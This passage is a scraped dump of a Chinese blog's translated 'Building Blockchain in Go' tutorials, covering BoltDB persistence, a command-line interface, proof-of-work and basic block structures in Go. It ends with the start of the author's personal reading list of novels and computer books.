bc.db.Update(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) err := b.Put(newBlock.Hash, newBlock.Serialize()) err = b.Put([]byte(\u0026#34;l\u0026#34;), newBlock.Hash) bc.tip = newBlock.Hash return nil }) } 让我们一部分一部分进行分析：\nerr := bc.db.View(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) lastHash = b.Get([]byte(\u0026#34;l\u0026#34;)) return nil }) 这是__BoltDB__数据库的另一种事务：只读（read-only）。这里我们从数据库中得到了最后一个区块的哈希，用来挖新的区块哈希。\nnewBlock := NewBlock(data, lastHash) b := tx.Bucket([]byte(blocksBucket)) err := b.Put(newBlock.Hash, newBlock.Serialize()) err = b.Put([]byte(\u0026#34;l\u0026#34;), newBlock.Hash) bc.tip = newBlock.Hash 在挖出新区块之后，我们将其序列化特征值存储到数据库中，并且更新\u0026quot;l\u0026quot;键，让它保存最新区块的哈希。\n完成了！并不是很难，对吗！\n检查区块链 所有的新区块现在保存在数据库中，所以我们现在可以重新打开这条链并且向其中添加新的区块。但是在实现了这些后，我们失去了一个非常好的特性：我们不能打印区块链中的区块了，因为我们不再像以前那样存储区块了。让我们修复这个瑕疵！\n__BoltDB__数据库允许对桶里的所有key进行迭代，但是所有的key都以字节顺序存储，我们又想以区块在区块链中的顺序进行打印。而且，因为我们不想加载内存中所有的区块（我们的区块链存储数据可能非常庞大！或者假装是这样），我们将把它们一个一个读出来。为此，我们需要一个区块链迭代器：\ntype BlockchainIterator struct { currentHash []byte db *bolt.DB } 每一个迭代器将在区块链中的区块需要迭代时创建，并且它将会保存当前迭代区块的哈希和一个数据库连接。因为后面的，一个迭代器附属于一个区块（这里的区块链是指存储了一个数据库连接的__Blockchain__实例），因此我们需要通过__Blockchain__方法进行创建：\nfunc (bc *Blockchain) Iterator() *BlockchainIterator { bci := \u0026amp;BlockchainIterator{bc.tip, bc.db} return bci } 注意的是，最初一个迭代器初始指向区块链的tip，所以区块将会被从顶到底获取，从最近创建的到最久之前创建的获取（我们这里把区块链想象成一个桶，最早创建的落在桶底，最晚（新）创建的在上面）。实际上，选择一个tip就意味着给一条链投票。一条区块链可以有多个分支，最长的那条被认为是主分支。在得到tip之后（它可以是区块链中的任意一个区块）我们就可以复现整条链，找到它的长度和构建它所需要的工作。这也同样意味着，一个tip也就是区块链的一种标识符。\n__BlockchainIterator__将只做一件事情：从一条区块链中返回下一个区块。\nfunc (i *BlockchainIterator) Next() *Block { var block *Block err := i.db.View(func(tx *bolt.Tx) error { b := tx.Bucket([]byte(blocksBucket)) encodedBlock := b.Get(i.currentHash) block = DeserializeBlock(encodedBlock) return nil }) i.currentHash = block.PrevBlockHash return block } 这就是数据库部分！\n命令行接口（CLI） 截止到目前，我们的实现没有提供任何程序交互接口：我们只是很简单的在__main__函数中执行__NewBlockchain__和__bc.AddBlock__。是时候改进它了！我们想要这样的命令：\nblockchain_go addblock \u0026#34;Pay 0.031337 for a coffee\u0026#34; blockchain_go printchain 所有的与命令行相关的操作将交给__CLI__结构体进行处理：\ntype CLI struct { bc *Blockchain } 它的入口在__Run__函数中：\nfunc (cli *CLI) Run() { cli.validateArgs() addBlockCmd := flag.NewFlagSet(\u0026#34;addblock\u0026#34;, flag.ExitOnError) printChainCmd := flag.NewFlagSet(\u0026#34;printchain\u0026#34;, flag.ExitOnError) addBlockData := addBlockCmd.String(\u0026#34;data\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Block data\u0026#34;) switch os.Args[1] { case \u0026#34;addblock\u0026#34;: err := addBlockCmd.Parse(os.Args[2:]) case \u0026#34;printchain\u0026#34;: err := printChainCmd.Parse(os.Args[2:]) default: cli.printUsage() os.Exit(1) } if addBlockCmd.Parsed() { if *addBlockData == \u0026#34;\u0026#34; { addBlockCmd.Usage() os.Exit(1) } cli.addBlock(*addBlockData) } if printChainCmd.Parsed() { cli.printChain() } } 我们使用标准包__flag__来解析命令行参数。\naddBlockCmd := flag.NewFlagSet(\u0026#34;addblock\u0026#34;, flag.ExitOnError) printChainCmd := flag.NewFlagSet(\u0026#34;printchain\u0026#34;, flag.ExitOnError) addBlockData := addBlockCmd.String(\u0026#34;data\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;Block data\u0026#34;) 首先，我们创建两个子命令__addblock__和__printchain__，然后我们添加__-data__标志在其中。__printchain__不需要任何标志。\nswitch os.Args[1] { case \u0026#34;addblock\u0026#34;: err := addBlockCmd.Parse(os.Args[2:]) case \u0026#34;printchain\u0026#34;: err := printChainCmd.Parse(os.Args[2:]) default: cli.printUsage() os.Exit(1) } 然后，我们检查用户提供的命令并且解析相关的__flag__子命令。\nif addBlockCmd.Parsed() { if *addBlockData == \u0026#34;\u0026#34; { addBlockCmd.Usage() os.Exit(1) } cli.addBlock(*addBlockData) } if printChainCmd.Parsed() { cli.printChain() } 接下来，我们检查哪个子命令被解析了然后运行相关的函数：\nfunc (cli *CLI) addBlock(data string) { cli.bc.AddBlock(data) fmt.Println(\u0026#34;Success!\u0026#34;) } func (cli *CLI) printChain() { bci := cli.bc.Iterator() for { block := bci.Next() fmt.Printf(\u0026#34;Prev. hash: %x\\n\u0026#34;, block.PrevBlockHash) fmt.Printf(\u0026#34;Data: %s\\n\u0026#34;, block.Data) fmt.Printf(\u0026#34;Hash: %x\\n\u0026#34;, block.Hash) pow := NewProofOfWork(block) fmt.Printf(\u0026#34;PoW: %s\\n\u0026#34;, strconv.FormatBool(pow.Validate())) fmt.Println() if len(block.PrevBlockHash) == 0 { break } } } 这部分非常类似于我们前面的那个。唯一的不同是我们现在使用了一个__BlockchainIterator__去迭代区块链中的区块。\n当然也不要忘了__main__函数中相应的修改：\nfunc main() { bc := NewBlockchain() defer bc.db.Close() cli := CLI{bc} cli.Run() } 注意，无论提供哪一个命令行参数都会创建一个新的区块链。\n完事儿了！让我们检查一切的运行是否如我们所愿：\n$ blockchain_go printchain No existing blockchain found. Creating a new one... Mining the block containing \u0026#34;Genesis Block\u0026#34; 000000edc4a82659cebf087adee1ea353bd57fcd59927662cd5ff1c4f618109b Prev. hash: Data: Genesis Block Hash: 000000edc4a82659cebf087adee1ea353bd57fcd59927662cd5ff1c4f618109b PoW: true $ blockchain_go addblock -data \u0026#34;Send 1 BTC to Ivan\u0026#34; Mining the block containing \u0026#34;Send 1 BTC to Ivan\u0026#34; 000000d7b0c76e1001cdc1fc866b95a481d23f3027d86901eaeb77ae6d002b13 Success! $ blockchain_go addblock -data \u0026#34;Pay 0.31337 BTC for a coffee\u0026#34; Mining the block containing \u0026#34;Pay 0.31337 BTC for a coffee\u0026#34; 000000aa0748da7367dec6b9de5027f4fae0963df89ff39d8f20fd7299307148 Success! $ blockchain_go printchain Prev. hash: 000000d7b0c76e1001cdc1fc866b95a481d23f3027d86901eaeb77ae6d002b13 Data: Pay 0.31337 BTC for a coffee Hash: 000000aa0748da7367dec6b9de5027f4fae0963df89ff39d8f20fd7299307148 PoW: true Prev. hash: 000000edc4a82659cebf087adee1ea353bd57fcd59927662cd5ff1c4f618109b Data: Send 1 BTC to Ivan Hash: 000000d7b0c76e1001cdc1fc866b95a481d23f3027d86901eaeb77ae6d002b13 PoW: true Prev. hash: Data: Genesis Block Hash: 000000edc4a82659cebf087adee1ea353bd57fcd59927662cd5ff1c4f618109b PoW: true Github的译者版本附加的测试：\n(看起来可以开酒（🍷or🍺）了)\n总结 接下来我们将实现地址、钱包以及交易（或许也有）。尽情期待！\nLinks：\nFull source codes Bitcoin Core Data Storage boltdb encoding/gob flag ","date":"2019-09-06T13:26:13+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart3%E6%8C%81%E4%B9%85%E5%8C%96%E5%92%8C%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8E%A5%E5%8F%A3/","title":"使用Golang构建区块链Part3：持久化和命令行接口"},{"content":"介绍 在前面的文章中我们构建了一个非常简单的数据结构，也是区块链数据库的精华所在。然后我们让区块链以“链式”的形式添加区块成为可能：每一个区块连接到它前面的一个区块。可是，我们的区块链实现有一个重大的瑕疵：往链上添加区块太过简单，花费的代价太低。让添加区块是一件非常艰难的工作，这是区块链和比特币的主旨。今天我们就去修复这个瑕疵。\n工作量证明 区块链的一个核心思想就是存放一个数据需要执行困难的工作。这个艰难的工作保证了区块链安全性和一致性。同时，这项困难的工作也带来相应的报酬（人们就是这样在挖矿中收获的比特币的）。\n这项机制非常像我们的真实生活：一个人必须去努力工作，获得报酬以至去维持生活。在区块链中，一些维持网络工作的参与者（矿工）去维持区块链网络，向其中添加新的区块，并获得奖励。得益于他们的工作，区块可以以一种安全的方式加入区块链，维持区块链数据库的稳定性。值得注意的是，完成这项工作的人必须注意到这一点。\n这些全部的“困难的工作并且去证明”的机制就叫做工作量证明（Proof-of-Work）。这是非常困难的，因为它需要非常强大的算力（计算能力）：甚至是高性能计算机也不能很快的将它计算出。此外，这项工作难度的增加使其保持着每小时的出块速度为6块。在区块链中，这项工作的目标是是为每个区块去寻找一个哈希（或者叫做散列），用来满足一些要求。然后用这个哈希去作为一个证明。因此，为这个真正的工作寻找出一个证明。\n最后一件需要注意的事情是，工作量证明必须满足一个要求：做这项工作是困难的，但是验证它却是容易的。一个证明通常情况下是交给别人完成的，所以对于他们，这不应该花费太多时间。\n哈希计算 在这一段落，我们将讨论哈希，如果你熟悉这个概念，你可以跳过这个部分。获取指定数据哈希值的过程就叫做哈希运算。一个哈希是对数据进行计算得到的独一无二的代表。一个哈希函数的功能是对任意大小的数据产生一个固定大小的哈希。这里有一些关于哈希的关键特点：\n原始数据不能从哈希反推。所以哈希并不是一种加密。 确定的数据只能产生一个哈希并且是独一无二的。 即使改变一个比特的输入数据也会得到截然不同的哈希。 哈希函数广泛的应用于检测数据的一致性（数据是否被篡改）。一些软件提供者为软件包添加出版验证，在下载之后你可以通过一个哈希函数来与软件开发者提供的进行比较。\n在区块链中，哈希用来保证区块的一致性。哈希函数的输入数据包括前一个区块，因此对于区块的修改成为不可能的事情（或者\u0026hellip;至少说是非常非常困难），一个人要是修改一个区块必须连同它后面的区块一并修改。\nHashcash 比特币中使用了__Hashcash__,一个最初成熟于防止垃圾邮件的工作量证明算法。它可以被分成这样的几步：\n获得一些公开的数据（在电子邮件中，它是收件者的邮箱地址，在比特币中，它是区块头）。 添加一个计数器__counter__进去，计数器从0开始。 得到__data+counter__组合的哈希。 检查哈希是否满足确定的要求。 如果是，那么你就完成了！ 如果不是，增加__counter__的数值，然后重复步骤3和步骤4. 因此，这是一种蛮力算法：你改变__counter__计数器的值，不断地计算新的哈希，检查它，增加__counter__的值，计算哈希\u0026hellip;这就是为什么在计算上来讲，是代价昂贵的。\n现在，让我们更近一步的看一下哈希需要满足的基本需求。在原始的__Hashcash__的实现中，这种需求是听起来像“哈希的前20比特位必须是零”这样的。在比特币中，这个必要条件随着时间不断调整，因为，刻意的，每十分钟才可以产生一个区块，即使计算能力随着时间的推移不断增加，而且有越来越多的矿工的加入。\n为了证明这个算法，我找了一个和先前例子相似的（“I like donuts”），然后找到一个前三位是0的哈希：\nca07ca__是计数器的16进制表示，也就是十进制系统中的__13240266。\n实现 好啦，我们现在完成了理论部分，让我们开始coding！！！首先，我们定义挖矿⛏难度：\nconst targetBits = 24 在比特币中，__\u0026ldquo;target bits\u0026rdquo;__是区块被挖出来时存储在区块头的难度。我们现在不用实现target的调整算法，所以我们可以用一个全局常量来定义难度。\n24可以是任意的一个数字，我们的目标是有一个占用内存少于256bit的target。同时，我们也想要足够的差异让它具有代表性，但是不要太大，因为差异越大就越难找到一个合适的哈希。\ntype ProofOfWork struct { block *Block target *big.Int } func NewProofOfWork(b *Block) *ProofOfWork { target := big.NewInt(1) target.Lsh(target, uint(256-targetBits)) pow := \u0026amp;ProofOfWork{b, target} return pow } 这里创建了__ProofOfWork__结构体，有一个指向区块的指针和一个指向target的指针。这里的“target”就是前面段落描述的“必要条件”的另一个名字。我们使用__big integer__是由于我们对哈希和target的比较方式：我们将哈希转换成一个big integer类型然后检查它是否小于target。\n在__NewProofOfWork__函数中，我们使用1初始化了一个__big.Int__并且将它左移了__256 - targetBits__比特位。256是一个__SHA-256__哈希函数，同时__SHA-256__哈希函数也是我们正要使用的。这个__target__的16进制的表示是：\n0x10000000000000000000000000000000000000000000000000000000000 然后它在内存中占用了29个字节。这里是它与前一个例子的哈希的视觉上的比较：\n0fac49161af82ed938add1d8725835cc123a1a87b1b196488360e58d4bfb51e3 0000010000000000000000000000000000000000000000000000000000000000 0000008b0f41ec78bab747864db66bcb9fb89920ee75f43fdaaeb5544f7f76ca 第一个哈希（从\u0026quot;I like donuts\u0026quot;计算得到）要比target大，因此它不是一个合法的工作量证明。第二个哈希（从\u0026quot;I like donutsca07ca\u0026quot;计算得到）是小于target的，所以这是一个有效证明。\n引自Github上的翻译版本：\n译者注：上面的形式化比较有些“言不符实”，其实它应该并非由 “I like donuts” 而来，但是原文表达的意思是没问题的，可能是疏忽而已。下面是我做的一个小实验：\npackage main import ( \u0026#34;crypto/sha256\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;math/big\u0026#34; ) func main() { data1 := []byte(\u0026#34;I like donuts\u0026#34;) data2 := []byte(\u0026#34;I like donutsca07ca\u0026#34;) targetBits := 24 target := big.NewInt(1) target.Lsh(target, uint(256-targetBits)) fmt.Printf(\u0026#34;%x\\n\u0026#34;, sha256.Sum256(data1)) fmt.Printf(\u0026#34;%64x\\n\u0026#34;, target) fmt.Printf(\u0026#34;%x\\n\u0026#34;, sha256.Sum256(data2)) } 输出：\n你可以把一个target想象成一个目标范围的上界：如果一个数（哈希）比这个界限小，它就是合法的；反之就是不合法的。比界限小将导致合法的数更少，因此也就需要进行更困难的工作去找到更有效的一个。\n现在，我们需要进行哈希的数据。让我们去准备它：\nfunc (pow *ProofOfWork) prepareData(nonce int) []byte { data := bytes.Join( [][]byte{ pow.block.PrevBlockHash, pow.block.Data, IntToHex(pow.block.Timestamp), IntToHex(int64(targetBits)), IntToHex(int64(nonce)), }, []byte{}, ) return data } 这些模块是直接了当的：我们仅仅合并了区块字段连带着__target__和__nonce__。nonce__是上文中__Hashcash__中所描述的计数器__counter，这是密码学术语。\n好啦，所有的准备已完成，让我们实现__POW__算法的核心：\nfunc (pow *ProofOfWork) Run() (int, []byte) { var hashInt big.Int var hash [32]byte nonce := 0 fmt.Printf(\u0026#34;Mining the block containing \\\u0026#34;%s\\\u0026#34;\\n\u0026#34;, pow.block.Data) for nonce \u0026lt; maxNonce { data := pow.prepareData(nonce) hash = sha256.Sum256(data) fmt.Printf(\u0026#34;\\r%x\u0026#34;, hash) hashInt.SetBytes(hash[:]) if hashInt.Cmp(pow.target) == -1 { break } else { nonce++ } } fmt.Print(\u0026#34;\\n\\n\u0026#34;) return nonce, hash[:] } 首先，我们初始化变量：__hashInt__是哈希的整数表现形式；nonce__是计数器。接下来，我们跑一个无限循环：它被__maxNonce__所限制，大小为__math.MaxInt64；这是避免__nonce__可能的溢出。虽然，对于计数器溢出来说，PoW的实现难度太低，但为了以防万一最好还是检查一下。\n在这个循环中，我们要做：\n准备数据。 使用__SHA-256__取得哈希。 将哈希转化成__big integer__类型。 将这个__integer__与__target__进行比较。 同前面的解释一样简单。现在我们可以移除__Block__的__SetHash__函数并对__NewBlock__函数进行修改：\nfunc NewBlock(data string, prevBlockHash []byte) *Block { block := \u0026amp;Block{time.Now().Unix(), []byte(data), prevBlockHash, []byte{}, 0} pow := NewProofOfWork(block) nonce, hash := pow.Run() block.Hash = hash[:] block.Nonce = nonce return block } 在这里你可以看到__nonce__作为一个__Block__的性质被存储。这是非常有必要的，因为__nonce__是为验证一个证明所准备的。现在__Block__结构如下所示：\ntype Block struct { Timestamp int64 Data []byte PrevBlockHash []byte Hash []byte Nonce int } 好啦！让我们运行程序，看看一切是否可以很好的运行：\nMining the block containing \u0026#34;Genesis Block\u0026#34; 00000041662c5fc2883535dc19ba8a33ac993b535da9899e593ff98e1eda56a1 Mining the block containing \u0026#34;Send 1 BTC to Ivan\u0026#34; 00000077a856e697c69833d9effb6bdad54c730a98d674f73c0b30020cc82804 Mining the block containing \u0026#34;Send 2 more BTC to Ivan\u0026#34; 000000b33185e927c9a989cc7d5aaaed739c56dad9fd9361dea558b9bfaf5fbe Prev. hash: Data: Genesis Block Hash: 00000041662c5fc2883535dc19ba8a33ac993b535da9899e593ff98e1eda56a1 Prev. hash: 00000041662c5fc2883535dc19ba8a33ac993b535da9899e593ff98e1eda56a1 Data: Send 1 BTC to Ivan Hash: 00000077a856e697c69833d9effb6bdad54c730a98d674f73c0b30020cc82804 Prev. hash: 00000077a856e697c69833d9effb6bdad54c730a98d674f73c0b30020cc82804 Data: Send 2 more BTC to Ivan Hash: 000000b33185e927c9a989cc7d5aaaed739c56dad9fd9361dea558b9bfaf5fbe Wow!你可以看到每个哈希现在都是以三个字节的0开始，而且它花费了一些时间去得到这些哈希。\n这里还有一件事情需要去做：让验证工作量证明成为可能。\nfunc (pow *ProofOfWork) Validate() bool { var hashInt big.Int data := pow.prepareData(pow.block.Nonce) hash := sha256.Sum256(data) hashInt.SetBytes(hash[:]) isValid := hashInt.Cmp(pow.target) == -1 return isValid } 这里就需要用到我们保存的__nonce__。\n让我们再检查一次一切是否🆗：\nfunc main() { ... for _, block := range bc.blocks { ... pow := NewProofOfWork(block) fmt.Printf(\u0026#34;PoW: %s\\n\u0026#34;, strconv.FormatBool(pow.Validate())) fmt.Println() } } 输出：\n... Prev. hash: Data: Genesis Block Hash: 00000093253acb814afb942e652a84a8f245069a67b5eaa709df8ac612075038 PoW: true Prev. hash: 00000093253acb814afb942e652a84a8f245069a67b5eaa709df8ac612075038 Data: Send 1 BTC to Ivan Hash: 0000003eeb3743ee42020e4a15262fd110a72823d804ce8e49643b5fd9d1062b PoW: true Prev. hash: 0000003eeb3743ee42020e4a15262fd110a72823d804ce8e49643b5fd9d1062b Data: Send 2 more BTC to Ivan Hash: 000000e42afddf57a3daa11b43b2e0923f23e894f96d1f24bfd9b8d2d494c57a PoW: true 引自Github上的翻译版本：\n译者注：\n从下图可以看出，这次我们产生三个块花费了一分多钟，比没有工作量证明之前慢了很多（也就是成本高了很多）：\n总结 我们距离真正的区块链更近了：添加区块现在需要繁重的工作，因此挖矿就成为可能。但是它仍然缺少一些重要的要点，这里没有钱包、没有地址、没有交易，也没有共识机制。这些事情我们将会在后面的文章中实现，至于现在，开心的挖矿⛏叭！\nLinks：\nFull source codes Blockchain hashing algorithm Proof of work Hashcash ","date":"2019-09-04T23:34:07+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart2%E5%B7%A5%E4%BD%9C%E9%87%8F%E8%AF%81%E6%98%8E/","title":"使用Golang构建区块链Part2：工作量证明"},{"content":"最前面 这个系列的博客是受了AnnatarHe的启发，他将JeiWan的__《Building Blockchain in Go》__系列文章进行了翻译。于是我要半翻译半转载的尽量完成这系列博客。\nReferences 为了不在以后忘记，我将__《使用Golang构建区块链》__系列博客的参考、引用、转载等信息写在最前面：\nAnnatarHe 这是翻译者的博客地址，具体文章在他的主页里。我很喜欢他的一些文章，包括非技术文，有一种像是“读了很多很多书、学了很多很多知识的另一个我”，或许我们在性格上有很多相似之处。 JeiWan 本系列文章的原创作者，我很喜欢他的博客名字__Going the distance__。 Github上另一个中文翻译版本，补充了很多要点 以上，致谢！\n介绍 区块链是21世纪最具有革命性的技术，它技术足够成熟而且潜力尚未完全发掘。在本质上，区块链是一个可以记录数据的分布式数据库。但独特的是它并不是一个隐私的数据库而是一个公开的，每一个使用它的人可以对它完全或者部分拷贝。并且，一条新的记录想要加入，必须经过所有维持它的人（所有节点）的同意。区块链使得加密货币以及智能合约成为可能。\n在接下来的一系列文章中，我们将使用区块链技术来构建一个简单的加密货币系统。\n区块 让我们从“区块链”的组成“区块”开始。区块链中，区块来存储有价值的信息。比如，比特币区块存储交易信息，这就是加密货币的精髓所在。除此之外，一个区块还包含一些技术信息，就像当前的版本，区块所存储的信息就包含当前的时间戳和上一个区块的hash（哈希）。\n本文中我们并不会按照描述区块链以及比特币那样构建一个十分完备的区块，而是实现一个较为简单的版本，仅仅包含关键的技术信息要点，它看起来就像下面：\ntype Block struct { Timestamp int64\t// 时间戳，由当前区块创建的时间转化而来 Data []byte\t// 区块存储的实际的有价值的信息，也就是交易 PrevBlockHash []byte\t// 前一个区块的哈希，也叫父哈希 Hash []byte\t// 当前区块的哈希 } 在比特币规格说明中，Timestamp、PrevBlockHash、Hash属于区块头（headers），这些形成一个独立数据结构，完整的比特币区块头的结构如下：\nField Purpose Updated when\u0026hellip; Size (Bytes) Version Block version number You upgrade the software and it specifies a new version 4 hashPrevBlock 256-bit hash of the previous block header A new block comes in 32 hashMerkleRoot 256-bit hash based on all of the transactions in the block A transaction is accepted 32 Time Current timestamp as seconds since 1970-01-01T00:00 UTC Every few seconds 4 Bits Current target in compact format The difficulty is adjusted 4 Nonce 32-bit number (starts at 0) A hash is tried (increments) 4 下面是比特币中使用Golang语言实现的btcd的BlockHeader的实现：\n// BlockHeader defines information about a block and is used in the bitcoin // block (MsgBlock) and headers (MsgHeaders) messages. type BlockHeader struct { // Version of the block. This is not the same as the protocol version. Version int32 // Hash of the previous block in the block chain. PrevBlock chainhash.Hash // Merkle tree reference to hash of all transactions for the block. MerkleRoot chainhash.Hash // Time the block was created. This is, unfortunately, encoded as a // uint32 on the wire and therefore is limited to 2106. Timestamp time.Time // Difficulty target for the block. Bits uint32 // Nonce used to generate the block. Nonce uint32 } 而交易（在我们这里是Data）则是另一个独立的数据结构。所以在这里我们为了简单这样来处理。在真正的比特币中，区块的数据结构如下：\nField Description Size Magic no value always 0xD9B4BEF9 4 bytes Blocksize number of bytes following up to end of block 4 bytes Blockheader consists of 6 items 80 bytes Transaction counter positive integer VI = VarInt 1 - 9 bytes transactions the (non empty) list of transactions -many transactions 所以，我们该如何计算哈希呢？哈希的计算是区块链的一个非常重要的特点，这个特点使得区块链是安全的。计算哈希在计算方面上是一件非常困难的操作，即使在一些性能非常好的计算机上也要花些时间（这就是为什么人们使用性能更加强劲的GPU来挖比特币）。这是一种刻意的结构设计，使得向区块链中添加区块是一件非常困难的事情，由此防止添加区块后又进行修改。我们将在后续的文章讨论并实现这个机制。\n至此，我们拿到了区块字段，然后连接起来，使用SHA-256哈希去计算连接起来的组合，我们在__SetHash__函数中做这些内容：\nfunc (b *Block) SetHash() { timestamp := []byte(strconv.FormatInt(b.Timestamp, 10)) headers := bytes.Join([][]byte{b.PrevBlockHash, b.Data, timestamp}, []byte{}) hash := sha256.Sum256(headers) b.Hash = hash[:] } 接着，按照Golang的惯例，我们将实现一个简单的创建区块的函数__NewBlock​__：\nfunc NewBlock(data string, prevBlockHash []byte) *Block { block := \u0026amp;Block{time.Now().Unix(), []byte(data), prevBlockHash, []byte{}} block.SetHash() return block } 这就是区块。\n区块链 现在，让我们实现区块链。区块链的本质是一个具有确定结构的数据库：一个有序的，向后连接（新区块由前一个区块生成，也就是可以向后迭代）的列表。也就意味着，每个新区块的插入是连接着前一个区块的。这种结构使得可以快速的得到前面的区块并且（有效的）通过哈希值找到某个区块。\n在Golang中，我们可以使用 array 和 map 结构来实现：数组可以保证哈希的有序性（Golang中数组是有序的），而 map （__map__是无序的）可以保证__哈希__到__区块__的映射。但是在我们的区块链原型中，我们仅使用一个数组，因为我们现在不需要通过哈希去寻找区块。\ntype Blockchain struct { blocks []*Block } 这是我们第一个区块链，我从没想过会这么简单 😉\n现在，让添加区块成为可能：\nfunc (bc *Blockchain) AddBlock(data string) { prevBlock := bc.blocks[len(bc.blocks)-1] newBlock := NewBlock(data, prevBlock.Hash) bc.blocks = append(bc.blocks, newBlock) } 就是这样，哦不\u0026hellip;\n要加入一个新的块，我们必须要有一个已经存在的区块，但是现在区块链中没有区块。所以，在任何区块链中，必须有至少一个区块，这种区块，是链的第一个，叫做__genesis__ block（创世纪块），让我们实现一个方法来创造这样一个块：\nfunc NewGenesisBlock() *Block { return NewBlock(\u0026#34;Genesis Block\u0026#34;, []byte{}) } 现在，我们可以实现一个函数，使用__genesis__ __block__来创建一个区块链：\nfunc NewBlockchain() *Blockchain { return \u0026amp;Blockchain{[]*Block{NewGenesisBlock()}} } 然我们来检查这个区块链的工作是否正确：\nfunc main() { bc := NewBlockchain() bc.AddBlock(\u0026#34;Send 1 BTC to Ivan\u0026#34;) bc.AddBlock(\u0026#34;Send 2 more BTC to Ivan\u0026#34;) for _, block := range bc.blocks { fmt.Printf(\u0026#34;Prev. hash: %x\\n\u0026#34;, block.PrevBlockHash) fmt.Printf(\u0026#34;Data: %s\\n\u0026#34;, block.Data) fmt.Printf(\u0026#34;Hash: %x\\n\u0026#34;, block.Hash) fmt.Println() } } 输出：\nPrev. hash: Data: Genesis Block Hash: aff955a50dc6cd2abfe81b8849eab15f99ed1dc333d38487024223b5fe0f1168 Prev. hash: aff955a50dc6cd2abfe81b8849eab15f99ed1dc333d38487024223b5fe0f1168 Data: Send 1 BTC to Ivan Hash: d75ce22a840abb9b4e8fc3b60767c4ba3f46a0432d3ea15b71aef9fde6a314e1 Prev. hash: d75ce22a840abb9b4e8fc3b60767c4ba3f46a0432d3ea15b71aef9fde6a314e1 Data: Send 2 more BTC to Ivan Hash: 561237522bb7fcfbccbc6fe0e98bbbde7427ffe01c6fb223f7562288ca2295d1 就是这样了！\n总结 我们构建了一个非常简单的区块链原型：仅仅是区块数组，每一个区块连接到它前一个区块。真实的区块更加的复杂。在我们的区块链中添加新的区块是非常简单并且迅速的，但是在真正的区块链中添加区块需要这样的工作：一是在添加区块之前需要进行十分繁重的计算（这个机制叫做Proof-of-Word工作量证明）。同时，区块链是一个分布式数据库，没有单独的决策者。因此，一个新的区块必须被这个网络（区块链网络）的参与者们确认和承认（这个机制叫共识机制）。别忘了我们现在区块中还没有交易！\n后面的文章中我们将覆盖到所有的这些要点。\nLinks:\nFull source codes: https://github.com/Jeiwan/blockchain_go/tree/part_1 Block hashing algorithm: https://en.bitcoin.it/wiki/Block_hashing_algorithm ","date":"2019-09-04T19:41:45+08:00","permalink":"https://lizonglingo.github.io/p/%E4%BD%BF%E7%94%A8golang%E6%9E%84%E5%BB%BA%E5%8C%BA%E5%9D%97%E9%93%BEpart1%E5%9F%BA%E6%9C%AC%E5%8E%9F%E5%9E%8B/","title":"使用Golang构建区块链Part1：基本原型"},{"content":" 今天把CSAPP第一遍过完了，题都没做。前几章还好，到后面就有些难读下去了。第二遍好好读也要做题。晚上心血来潮整理一下整个二年级的书单，少部分是时间更前些的，有读完的，正在读的，读了一点就放下的，当然更多的还是没读过的\u0026hellip;不过买书的感觉是真好a！\n说明 属性 （*为非必须项）：\n书名 （如果找到书的链接会放上，但并不代表购买渠道）\n作者\n*推荐 （读过或者读完会打⭐，满分5⭐）\n*其他的事情\n分类：\n小说\n计算机专业书籍\n语言类\n区块链\n机器学习\nLinux\n等\nps:希望以后能将这些技能树都点的很亮\n书单 小说 小说几乎都18年的，这个学期没怎么看\u0026hellip;按书架的顺序来\n《Uncle Tom\u0026rsquo;s Cabin》\n作者：Harriet Elizabeth Beecher Stowe\n这是一本全英的\u0026hellip;emmmm里面纸业泛黄的1995年印刷的书，那次书店遇到因为上述原因就买来落灰了\u0026hellip;\n《尼罗河上的惨案》\n作者：阿加莎·克里斯\n《罗杰疑案》\n作者：阿加莎·克里斯蒂\n⭐⭐⭐⭐\n《小王子》\n作者：安托万·德·圣埃克絮佩里\n⭐⭐⭐⭐⭐\n这本是同老师的🎁！到现在书里有些话我还是不明白~\n《一桩事先张扬的凶杀案》\n作者：加西亚·马尔克斯\n⭐⭐⭐\n《枯枝败叶》\n作者：加西亚·马尔克斯\n⭐⭐⭐\n《一个海难幸存者的故事》\n作者：加西亚·马尔克斯\n⭐⭐⭐⭐\n《没有人给他写信的上校》\n作者：加西亚·马尔克斯\n⭐⭐⭐⭐\n《百年孤独》\n作者：加西亚·马尔克斯\n⭐⭐⭐⭐⭐\n无法形容这本书的开头，像电影一般的 “多年以后，面对行刑队，奥雷里亚诺·布恩迪亚上校将会想起父亲带他去见识冰块的那个遥远的下午。那时的马孔多\u0026hellip;\u0026hellip;” 绝对是值得反复体会的一本书。就是书里的人名好难记~\n《霍乱时期的爱情》\n作者：加西亚·马尔克斯\n⭐⭐⭐⭐⭐\n这本书相对友好一些，就是相对《百年孤独》好读一些,也超级推荐~\n《巴黎圣母院》\n作者：雨果\n《白鹿原》\n作者：陈忠实\n⭐⭐⭐⭐\n《月亮和六便士》\n作者：毛姆\n⭐⭐⭐⭐\n《围城》\n作者：钱锺书\n《白夜行》\n作者：东野圭吾\n⭐⭐⭐⭐⭐\n读完这本书那晚记得很清楚是凌晨两点多了，然后胡思乱想了一夜~\n《教父》\n作者：马里奥·普佐\n⭐⭐⭐⭐⭐\n《教父2 西西里人》\n作者：马里奥·普佐\n⭐⭐⭐⭐\n《教父3 最后的教父》\n作者：马里奥·普佐\n《希腊棺材之谜》\n作者：埃勒里·奎因\n《东方快车谋杀案》\n作者：阿加莎·克里斯蒂\n⭐⭐⭐⭐⭐\n《X的悲剧》\n作者：埃勒里·奎因\n⭐⭐⭐\n《Y的悲剧》\n作者：埃勒里·奎因\n⭐⭐⭐⭐\n《Z的悲剧》\n作者：埃勒里·奎因\n《哲瑞·雷恩的最后一案》\n作者：埃勒里·奎因\n计算机专业书籍 这个分类里就读过一本\u0026hellip;别看书少，吃透一本就很厉害了！\n《深入理解计算机系统（原书第3版）》\n作者：Randal E.Bryant/David 